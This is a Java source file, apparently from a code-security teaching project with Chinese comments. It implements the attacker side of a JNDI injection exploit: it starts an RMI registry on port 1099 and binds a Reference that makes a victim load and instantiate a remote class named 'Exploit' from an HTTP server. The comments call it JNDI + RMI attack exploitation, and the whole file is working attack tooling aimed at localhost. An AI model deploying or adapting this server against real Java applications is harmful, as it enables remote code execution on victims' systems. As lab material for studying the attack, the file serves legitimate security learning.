package com.madaha.codesecone.controller.jndi;

import javax.naming.InitialContext;
import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * JNDI + RMI 攻击利用
 * @poc rmi:127.0.0.0:1099/Object
 */
public class JNDIRmiServer {
    public static void main(String[] args) throws Exception {
        // jndi 命名服务初始化
        InitialContext initialContext = new InitialContext();

        // 注册本地 rmi 服务，初始化端口为默认 1099 端口。
        Registry registry = LocateRegistry.createRegistry(1099);

        /**
         * Reference 封装的是恶意服务器上的类文件：
         *
         * 使用 Reference 包装，封装攻击者服务器上的恶意类：
         *      参数1：className – 远程加载时所使用的类名
         *      参数2：classFactory – 加载的class中需要实例化类的名称
         *      参数3：classFactoryLocation – 提供classes数据的地址可以是file/ftp/http协议
         */
        Reference reference = new Reference("Exploit", "Exploit","http://127.0.0.1:8000");

        // 将 rmi 服务与 Reference 进行绑定，提供远程服务器上的对象为客户端使用；
        initialContext.bind("rmi:127.0.0.1:Object", reference);





        System.out.println("[+] rmi://127.0.0.1/Object" + "Jndi + RMI 服务已启动！");
    }


}
